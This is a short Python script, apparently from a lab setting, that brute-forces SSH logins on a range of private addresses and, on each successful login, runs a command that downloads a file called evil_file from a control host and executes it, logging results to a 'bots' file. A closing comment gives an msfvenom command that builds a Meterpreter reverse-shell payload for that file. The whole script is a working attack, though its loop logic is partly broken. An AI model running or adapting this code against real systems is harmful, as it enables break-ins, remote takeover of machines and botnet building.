import paramiko
import multiprocessing
import warnings

# remove depracated warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

# small dictionary list
user_list = ['fresh1','fresh2','fresh3','fresh4']
pass_list = ['fresh4','fresh3','fresh2','fresh1']
jobs = []
num = 0
num2 = 0

def ssh_start():
    ip = "192.168.203.%d" % i
    print "Connecting:", ip, user_list[num] + pass_list[num2]
    p = paramiko.SSHClient()
    p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        p.connect(ip, username=user_list[num], password=pass_list[num2])
        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file"; chmod 755 evil_file; ./evil_file')
        # print then append target's output into file 'bots' on C&C.
        # stdin, stdout, stderr = p.exec_command('uname -a; id')
        f = open("bots", "a")
        f.write("=" * 70 + "\n")
        f.write("ip: %s\n" % ip)
        for line in stdout:
            print(line.strip('\n'))
            f.write(line)
        for line in stderr:
            print(line.strip('\n'))
            f.write(line)
        f.write("=" * 70 + "\n")
        f.close()
    except paramiko.AuthenticationException:
            pass

for i in range(150,155):
    for num in range(0,4):
        for num2 in range(0,4):
            p = multiprocessing.Process(target=ssh_start)
            jobs.append(p)
            p.start()
            #p.join()	# slow ver. & doesn't detach from evil_file connection
            num2 += 1
        num += 1

# msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file
